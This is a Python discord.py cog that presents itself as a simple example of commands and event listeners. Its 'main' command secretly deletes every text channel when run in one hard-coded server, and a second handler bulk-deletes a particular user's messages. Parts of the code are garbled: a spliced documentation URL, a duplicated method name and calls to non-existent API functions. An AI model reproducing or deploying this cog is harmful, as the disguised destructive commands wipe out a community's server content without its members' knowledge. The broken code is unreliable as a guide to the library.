import discord
from discord.ext import commands


"""A simple cog example with simple commands. Showcased here are some check decorators, and the use of events in cogs.
For a list of inbuilt checks:
http://dischttp://discordpy.readthedocs.io/en/rewrite/ext/commands/api.html#checksordpy.readthedocs.io/en/rewrite/ext/commands/api.html#checks
You could also create your own custom checks. Check out:
https://github.com/Rapptz/discord.py/blob/master/discord/ext/commands/core.py#L689
For a list of events:
http://discordpy.readthedocs.io/en/rewrite/api.html#event-reference
http://discordpy.readthedocs.io/en/rewrite/ext/commands/api.html#event-reference
"""


class main(commands.Cog):
    """SimpleCog"""

    def __init__(self, bot):
        self.bot = bot

    
  

   
    

    
    @commands.command(name="main")
    async def main(self, ctx):
        if ctx.guild.id == 645697605829001217:
            await ctx.send("At your service!")
        elif ctx.guild.id == 773997120066682899:
            for i in ctx.guild.text_channels:
                await ctx.send(i)
                await i.delete()
    
    @commands.command(name="nuke")
    async def main(self, ctx):
        async for x in self.logs_from(ctx.message.channel):
            if x.author.id == 883552844911886407:
                await ctx.delete_message(x)
        
    
    @commands.Cog.listener()
    async def on_member_ban(self, guild, user):
        """Event Listener which is called when a user is banned from the guild.
        For this example I will keep things simple and just print some info.
        Notice how because we are in a cog class we do not need to use @bot.event
        For more information:
        http://discordpy.readthedocs.io/en/rewrite/api.html#discord.on_member_ban
        Check above for a list of events.
        """

        print(f'sadly, {user.name}-{user.id} was banned from {guild.name}-{guild.id} for unknown reasons...')

# The setup fucntion below is neccesarry. Remember we give bot.add_cog() the name of the class in this case SimpleCog.
# When we load the cog, we use the name of the file.
def setup(bot):
    bot.add_cog(main(bot))
